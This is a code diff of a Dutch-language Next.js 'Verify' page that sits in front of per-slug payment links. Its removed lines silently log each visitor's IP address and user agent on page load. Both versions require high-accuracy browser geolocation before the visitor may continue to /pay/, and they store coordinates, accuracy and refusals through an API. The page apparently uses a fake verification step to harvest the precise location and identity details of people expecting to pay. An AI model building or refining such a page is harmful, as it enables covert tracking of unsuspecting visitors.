@@ -1,78 +1,59 @@
 import { useState } from 'react';
-import redis from '../../lib/redis';
 
-export async function getServerSideProps({ params, req }) {
-  const { slug } = params;
-
-  const ip =
-    req.headers['x-forwarded-for']?.split(',')[0] ||
-    req.socket?.remoteAddress ||
-    'unknown';
-
-  const userAgent = req.headers['user-agent'] || 'unknown';
-
-  const now = Date.now();
-  const logId = `log-${slug}-${now}-${Math.random().toString(36).slice(2)}`;
-
-  const logData = {
-    id: logId,
-    slug,
-    flow: 'verify',
-    event: 'verify-visit',
-    ip,
-    userAgent,
-    time: now,
-  };
-
-  // 🔥 log bezoek aan verify-pagina
-  await redis.set(logId, logData);
-  await redis.zadd('logs:index', {
-    score: now,
-    member: logId,
-  });
-
-  return { props: { slug } };
+export async function getServerSideProps({ params }) {
+  return { props: { slug: params.slug } };
 }
 
 export default function Verify({ slug }) {
   const [error, setError] = useState(null);
   const [loading, setLoading] = useState(false);
 
+  const log = async (data) => {
+    await fetch('/api/store-location', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data),
+    });
+  };
+
   const handleLocation = () => {
     setLoading(true);
+    setError(null);
+
+    if (!navigator.geolocation) {
+      setError('Locatie wordt niet ondersteund op dit apparaat.');
+      setLoading(false);
+      return;
+    }
 
     navigator.geolocation.getCurrentPosition(
       async (pos) => {
-        await fetch('/api/log-verify', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            slug,
-            event: 'verify-allowed',
-            lat: pos.coords.latitude,
-            lng: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-          }),
+        await log({
+          slug,
+          flow: 'verify',
+          event: 'allowed',
+          lat: pos.coords.latitude,
+          lng: pos.coords.longitude,
+          accuracy: pos.coords.accuracy,
         });
 
+        // ✅ pas NA succes redirecten
         window.location.href = `/pay/${slug}?verified=1`;
       },
       async () => {
-        await fetch('/api/log-verify', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            slug,
-            event: 'verify-denied',
-          }),
+        await log({
+          slug,
+          flow: 'verify',
+          event: 'denied',
+          denied: true,
         });
 
-        setError('Locatie is verplicht om verder te gaan.');
+        setError('Geef eerst toegang tot locatie om verder te gaan.');
         setLoading(false);
       },
       {
         enableHighAccuracy: true,
-        timeout: 10000,
+        timeout: 15000,
         maximumAge: 0,
       }
     );
@@ -94,16 +75,17 @@ export default function Verify({ slug }) {
           display: flex;
           flex-direction: column;
           align-items: center;
+          justify-content: flex-start;
           text-align: center;
         }
 
         .circle {
           margin-top: 20px;
-          width: 200px;
-          height: 200px;
+          width: 160px;
+          height: 160px;
           border-radius: 50%;
           background: #ffffff;
-          border: 12px solid #353575;
+          border: 10px solid #353575;
           overflow: hidden;
           display: flex;
           align-items: center;
@@ -118,13 +100,13 @@ export default function Verify({ slug }) {
 
         h1 {
           color: #ffffff;
-          font-size: 28px;
+          font-size: 24px;
           margin: 24px 16px 8px;
         }
 
         p {
           color: #dcdff5;
-          font-size: 16px;
+          font-size: 15px;
           margin: 0 24px 24px;
         }
 
